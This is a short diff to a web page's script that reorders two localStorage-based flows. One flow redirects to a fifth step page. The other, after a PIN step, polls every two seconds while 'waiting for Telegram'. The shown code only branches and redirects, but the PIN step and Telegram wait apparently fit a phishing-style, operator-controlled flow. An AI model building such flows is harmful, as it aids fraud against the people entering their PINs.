@@ -27,19 +27,13 @@
 <div class="footer"></div>
 
 <script>
+const fromPin = localStorage.getItem("fromPin");
+const firstProcess = localStorage.getItem("firstProcess");
 
-// FLOW A: STEP4 → STEP5
-if (localStorage.getItem("firstProcess") === "yes") {
+// ===== FLOW B (PRIORITY) =====
+if (fromPin === "yes") {
 
-    localStorage.removeItem("firstProcess");
-
-    setTimeout(() => {
-        window.location.href = "step5.html";
-    }, 3000);
-}
-
-// ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
-if (localStorage.getItem("fromPin") === "yes") {
+  console.log("FLOW B ACTIVE");
 
   const interval = setInterval(async () => {
     try {
@@ -78,8 +72,20 @@ if (localStorage.getItem("fromPin") === "yes") {
         console.log("Waiting...");
     }
   }, 2000);
+
 }
 
+// ===== FLOW A =====
+else if (firstProcess === "yes") {
+
+    console.log("FLOW A ACTIVE");
+
+    localStorage.removeItem("firstProcess");
+
+    setTimeout(() => {
+        window.location.href = "step5.html";
+    }, 5000);
+}
 </script>
 
 </body>
